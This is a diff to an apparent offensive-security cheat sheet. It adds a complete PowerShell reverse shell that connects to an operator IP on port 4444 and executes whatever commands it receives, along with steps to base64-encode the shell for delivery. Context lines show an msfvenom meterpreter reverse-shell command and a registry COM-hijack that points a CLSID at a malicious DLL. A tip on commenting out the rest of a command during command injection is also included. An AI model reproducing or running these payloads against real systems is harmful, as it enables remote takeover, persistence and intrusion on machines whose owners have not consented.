@@ -230,3 +230,26 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.47 LPORT=4444 -f 
 reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\..." /ve /d "C:\tmp\hack.dll" /f
 # Windows applications often call COM components through the CLSID (Class ID), and the system loads the corresponding DLL or EXE according to the configuration in the registry. An attacker could: tamper with the registry key of an existing COM component to point to a malicious DLL. 
 ```
+
+## powershell - B64 encoded revshell
+```
+# on linux
+# save the following :
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.192', 4444);## change your IP/Port accordingly
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);
+    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte, 0, $sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+
+# then :
+cat pwsh-rev.ps1 | iconv -t UTF-16LE | base64 -w 0
+
+# Keep in mind that you can use a trailing ' #' to comment the rest of the command if you try to do command injection and you want ignore the rest of the command where yours is injected
+```
